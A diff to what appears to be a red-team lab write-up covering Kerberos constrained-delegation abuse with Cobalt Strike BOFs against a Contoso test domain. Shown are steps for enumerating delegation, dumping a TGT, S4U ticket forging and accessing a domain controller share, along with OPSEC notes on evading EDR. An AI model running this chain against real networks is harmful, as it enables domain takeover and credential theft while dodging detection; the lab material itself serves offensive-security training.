@@ -16,7 +16,7 @@ Load the Kerbeus BOF aggressor script before running any `krb_*` commands:
 Cobalt Strike → Script Manager → Load → C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
 ```
 
-> `OPSEC-SAFE` — BOF-based Kerberos operations run in beacon thread with no child process spawn.
+> OPSEC-🟢SAFE — BOF-based Kerberos operations run in beacon thread with no child process spawn.
 
 <img src="/images/kerberos-challenge01.png" width=860>
 
@@ -65,7 +65,7 @@ msDS-AllowedToDelegateTo: ldap/lon-dc-1.contoso.com, ldap/lon-dc-1
 retreived 1 results total
 ```
 
-> `OPSEC-SAFE` — BOF ldapsearch, runs in beacon thread, no child process.
+> OPSEC-🟢SAFE — BOF ldapsearch, runs in beacon thread, no child process.
 
 **Finding:** `LON-WKSTN-1$` has constrained delegation configured for `ldap/lon-dc-1.contoso.com` — **LDAP only, no CIFS**. This is the misconfiguration. The service class `ldap` can be substituted with `cifs` in the ticket header because the target DC only validates the encrypted portion.
 
@@ -101,7 +101,7 @@ Authentication  : Negotiate
     doIFrDCCBaigAwIBBaEDAg<snip>AgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ==
 ```
 
-> `OPSEC-CAUTION` — BOF, no child process. Uses `LsaCallAuthenticationPackage` Kerberos API — EDR hooks on this API will fire. Does not touch LSASS memory directly.
+OPSEC-🟠CAUTION — BOF, no child process. Uses `LsaCallAuthenticationPackage` Kerberos API — EDR hooks on this API will fire. Does not touch LSASS memory directly.
 
 Copy the full base64 TGT string (ticket index `[0]` — the forwarded, forwardable ticket). Used in the next step.
 
@@ -134,7 +134,7 @@ Output:
 doIGhDCCBoCgAwIBBaEDAgEWo<snip>9OVE9TTy5DT02pGzAZoAMCAQKhEjAQGwRjaWZzGwhsb24tZGMtMQ==
 ```
 
-> `OPSEC-SAFE` — `krb_s4u` is a BOF. Runs in beacon thread, no child process, no disk write on target.
+> OPSEC-🟢SAFE — `krb_s4u` is a BOF. Runs in beacon thread, no child process, no disk write on target.
 
 <img src="/images/kerberos-challenge05.png" width=860>
 
@@ -192,7 +192,7 @@ Output:
  1gb      fil     04/12/2026 14:05:24   pagefile.sys
 ```
 
-> `OPSEC-SAFE` — `make_token` creates a sacrificial logon session in beacon memory. `kerberos_ticket_use` injects the ticket into that session — no disk write on target, no child process.
+> OPSEC-🟢SAFE — `make_token` creates a sacrificial logon session in beacon memory. `kerberos_ticket_use` injects the ticket into that session — no disk write on target, no child process.
 
 Drop impersonation when done:
 
@@ -238,13 +238,13 @@ ls \\lon-dc-1\c$                   → OBJECTIVE COMPLETE
 
 | Step | Command | Tier | Notes |
 |------|---------|------|-------|
-| Enumerate tickets | `krb_triage` | SAFE | BOF, in-thread |
-| Find delegation | `ldapsearch` | SAFE | BOF, in-thread |
-| Dump TGT | `krb_dump` | CAUTION | LsaCallAuthenticationPackage — EDR hook may fire |
-| S4U abuse | `krb_s4u` | SAFE | BOF, in-thread, no disk write |
-| Create token | `make_token` | SAFE | In-memory logon session, no network auth |
-| Inject ticket | `kerberos_ticket_use` | SAFE | Injected via C2, no target disk write |
-| Access share | `ls \\lon-dc-1\c$` | CAUTION | SMB access to DC — logged as logon event on DC |
+| Enumerate tickets | `krb_triage` | OPSEC-🟢SAFE | BOF, in-thread |
+| Find delegation | `ldapsearch` | OPSEC-🟢SAFE | BOF, in-thread |
+| Dump TGT | `krb_dump` | OPSEC-🟠CAUTION | LsaCallAuthenticationPackage — EDR hook may fire |
+| S4U abuse | `krb_s4u` | OPSEC-🟢SAFE | BOF, in-thread, no disk write |
+| Create token | `make_token` | OPSEC-🟢SAFE | In-memory logon session, no network auth |
+| Inject ticket | `kerberos_ticket_use` | OPSEC-🟢SAFE | Injected via C2, no target disk write |
+| Access share | `ls \\lon-dc-1\c$` | OPSEC-🟠CAUTION | SMB access to DC — logged as logon event on DC |
 
 ---
 
